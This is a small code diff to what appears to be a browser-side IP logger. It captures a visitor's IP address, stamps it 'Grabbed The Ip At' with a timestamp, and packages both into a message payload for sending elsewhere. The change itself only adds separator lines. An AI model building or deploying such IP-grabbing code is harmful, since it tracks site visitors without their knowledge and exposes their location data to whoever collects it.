@@ -25,7 +25,7 @@
         const minutes = String(georgianTime.getMinutes()).padStart(2, "0");
         const seconds = String(georgianTime.getSeconds()).padStart(2, "0");
 
-        return ` \n \n Grabbed The Ip At: \n ${year}-${month} ${day} || :${hours}:${minutes}:${seconds}  (Georgian Time)`;
+        return ` \n \n Grabbed The Ip At: \n ${year}-${month} ${day} || :${hours}:${minutes}:${seconds}  (Georgian Time) \n-----------------------------------`;
       }
 
       async function getIP() {
@@ -56,7 +56,8 @@
         const timestamp = getGeorgianTime();
 
         const payload = {
-          content: `IP Address: ${ip}\nTimestamp: ${timestamp}`,
+          content: `-----------------------------------
+          \n IP Address: ${ip}\nTimestamp: ${timestamp}`,
         };
 
         try {
